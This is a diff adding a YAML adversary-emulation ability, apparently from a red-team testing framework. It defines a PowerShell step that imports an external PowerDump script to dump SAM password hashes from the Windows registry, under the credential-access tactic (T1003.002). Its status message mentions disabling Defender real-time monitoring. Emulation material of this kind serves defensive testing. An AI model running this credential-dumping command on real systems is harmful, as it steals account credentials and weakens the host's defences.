@@ -1,0 +1,15 @@
+- description: Executes a hashdump by reading the hashes from the registry.
+  id: 3bcfa369fd1f214e4d05944228eeb212
+  name: PowerDump Hashes and Usernames from Registry
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME
+          MON" -fore green; Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1";
+          Invoke-PowerDump
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: 'OS Credential Dumping: Security Account Manager'
